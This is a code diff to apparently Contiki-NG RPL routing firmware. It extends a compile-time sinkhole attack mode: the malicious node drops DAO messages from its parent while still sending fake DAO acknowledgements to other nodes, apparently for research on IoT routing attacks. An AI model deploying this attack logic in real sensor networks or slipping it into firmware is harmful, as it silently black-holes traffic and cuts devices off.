@@ -53,12 +53,18 @@ bool icmp6_stats_sink_hole = false;
 bool icmp6_stats_drop_fwd_udp = false;
 /*---------------------------------------------------------------------------*/
 static bool
-is_parent(const uip_ipaddr_t *addr, uint8_t instance_id)
+is_parent(const uip_ipaddr_t *addr, uint8_t instance_id, bool compare_mac)
 {
 #if ROUTING_CONF_RPL_LITE
   uip_ipaddr_t *parent;
   parent = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);
-  return parent != NULL && uip_ipaddr_cmp(addr, parent);
+  if(parent == NULL) {
+    return false;
+  }
+  if(compare_mac) {
+    return memcmp(&addr->u8[8], &parent->u8[8], 8) == 0;
+  }
+  return uip_ipaddr_cmp(addr, parent);
 #elif ROUTING_CONF_RPL_CLASSIC
   rpl_instance_t *instance;
   rpl_parent_t *parent;
@@ -122,7 +128,7 @@ process_dio_input(struct uip_icmp_hdr *hdr)
 #if ATTACK_DROP_DIO
   if(icmp6_stats_sink_hole) {
     uint8_t *payload = (uint8_t *)(hdr + 1);
-    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0])) {
+    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], false)) {
       LOG_INFO("allowing DIO from parent ");
       LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
       LOG_INFO_("\n");
@@ -147,14 +153,20 @@ process_dao_input(struct uip_icmp_hdr *hdr)
 #if ROUTING_CONF_RPL_LITE
   if(icmp6_stats_sink_hole) {
     uint8_t *payload = (uint8_t *)(hdr + 1);
-    uint8_t flags = payload[1];
-    uint8_t sequence = payload[3];
-    if(flags & RPL_DAO_K_FLAG) {
-      /* Node requests a DAO ACK */
-      LOG_INFO("sending fake DAO ACK to ");
+    if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], true)) {
+      LOG_INFO("drop DAO from parent ");
       LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
       LOG_INFO_("\n");
-      rpl_timers_schedule_dao_ack(&UIP_IP_BUF->srcipaddr, sequence);
+    } else {
+      uint8_t flags = payload[1];
+      uint8_t sequence = payload[3];
+      if(flags & RPL_DAO_K_FLAG) {
+        /* Node requests a DAO ACK */
+        LOG_INFO("sending fake DAO ACK to ");
+        LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+        LOG_INFO_("\n");
+        rpl_timers_schedule_dao_ack(&UIP_IP_BUF->srcipaddr, sequence);
+      }
     }
     return NETSTACK_IP_DROP;
   }
